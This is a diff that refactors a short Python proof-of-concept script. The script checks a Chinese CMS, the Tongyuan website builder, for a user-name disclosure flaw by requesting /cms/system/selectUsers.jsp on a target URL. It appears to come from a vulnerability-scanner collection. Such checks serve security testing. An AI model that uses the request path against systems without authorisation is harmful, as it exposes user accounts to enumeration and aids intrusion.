@@ -9,17 +9,10 @@ description: 未做权限过滤，可以显示所有用户的用户名
 import sys
 import requests
 import warnings
-
-
-
-class users_disclosure:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['通元建站系统用户名泄露漏洞','','']
         payload = "/cms/system/selectUsers.jsp"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
@@ -35,5 +28,5 @@ class users_disclosure:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = users_disclosure(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
